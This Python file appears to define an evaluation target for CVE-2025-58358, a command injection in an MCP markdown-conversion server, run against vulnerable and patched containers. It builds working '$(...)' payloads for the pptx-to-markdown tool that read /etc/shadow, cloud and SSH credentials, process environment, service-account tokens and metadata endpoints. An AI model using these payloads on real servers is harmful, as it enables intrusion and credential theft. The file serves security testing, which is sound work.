"""CVE-2025-58358: OS command injection in mcp-markdownify-server (command execution).

The pptx-to-markdown tool passes its `filepath` (and `uvPath`) unsanitised into a shell string run
with child_process.exec. Each exploit drives that one tool with uvPath="echo", so the shell command
becomes `echo run <markitdown> "<filepath>"` and the filepath carries `$(<reader>)`: on the
vulnerable server (949f12e, npm 0.0.1) the shell executes the reader and echoes its output into the
tool response, while on the patched server (a31204d, execFile with an argument array, no shell) the
`$(...)` is echoed verbatim.

The reach is command_execution, so every kept place is read by running a command: cat for files, id
for the account, hostname for the UTS name, tr</proc/self/environ for the env var, curl for the
internal HTTP endpoints.
"""

import re

from evals.cve_environments import command_injection_env
from evals.cve_grammar import MechanismClass
from evals.cve_places import Place, Places, PlantKind
from evals.cve_planting import PlantingHost, SymbolicUser
from evals.cve_planting_spec import resolve_container_path
from evals.cve_targets import CVETarget
from mcp_auditor.domain.ports import MCPClientPort

WORKDIR = "/srv/app"
AIM = re.compile(r"\$\(")  # a command substitution in the arguments: the injection attempt

KEPT_PLACES = (
    "process-account-identity",
    "etc-shadow",
    "container-hostname",
    "aws-credentials",
    "gcloud-adc",
    "azure-profile",
    "ssh-private-key",
    "shell-history",
    "git-credentials",
    "npmrc",
    "gh-hosts",
    "docker-config",
    "kube-config",
    "pgpass",
    "mysql-client-cnf",
    "mongorc",
    "mysql-system-cnf",
    "proc-environ",
    "run-secrets",
    "k8s-sa-token",
    "imds",
    "ecs-task-credentials",
    "eks-pod-identity",
    "etc-hosts",
    "auth-log",
)


def _reader(place: Place) -> str:
    coord = place.coordinates
    if place.kind is PlantKind.FILE:
        raw = coord.paths if coord.paths is not None else (coord.path,)
        paths = " ".join(resolve_container_path(p, WORKDIR) for p in raw if p)
        return f"cat {paths} 2>/dev/null"
    if place.kind is PlantKind.ENV:
        return "cat /proc/self/environ 2>/dev/null | tr '\\0' '\\n'"
    if place.kind is PlantKind.ACCOUNT:
        return "id 2>/dev/null"
    if place.kind is PlantKind.HOSTNAME:
        return "hostname 2>/dev/null"
    if place.kind is PlantKind.HTTP_ENDPOINT:
        return f'curl -s "http://{coord.host}{coord.path}"'
    raise ValueError(f"{place.id}: no command reader for kind {place.kind}")


def _exploit(place_id: str):
    async def run(places: Places, client: MCPClientPort) -> None:
        payload = f"$({_reader(places[place_id])})"
        await client.call_tool("pptx-to-markdown", {"uvPath": "echo", "filepath": payload})

    return run


async def _benign(places: Places, client: MCPClientPort) -> None:
    await client.call_tool("get-markdown-file", {"filepath": "/opt/benign.md"})


TARGET = CVETarget(
    cve_id="CVE-2025-58358",
    severity="CVSS 8.8 (v3.1, placeholder)",
    mechanism=MechanismClass.COMMAND_EXECUTION,
    aim=AIM,
    reaches=frozenset({"command_execution"}),
    kept_places=KEPT_PLACES,
    images=("holdout-2025-58358-markdownify",),
    server_image="holdout-2025-58358-markdownify",
    patched_image="holdout-2025-58358-markdownify-patched",
    planting_host=PlantingHost(SymbolicUser.UNPRIVILEGED, WORKDIR, has_network=False),
    builder=command_injection_env,
    exploits=tuple(_exploit(place_id) for place_id in KEPT_PLACES),
    benign=_benign,
    awaited_capability=None,
    note=(
        "OS command injection: the pptx-to-markdown tool interpolates its attacker-controlled "
        "filepath (with uvPath) into a shell string run with child_process.exec, so a `$(...)` "
        "command substitution executes an arbitrary command in the server's container."
    ),
    tools_filter=None,
    ci_skip_reason=None,
)
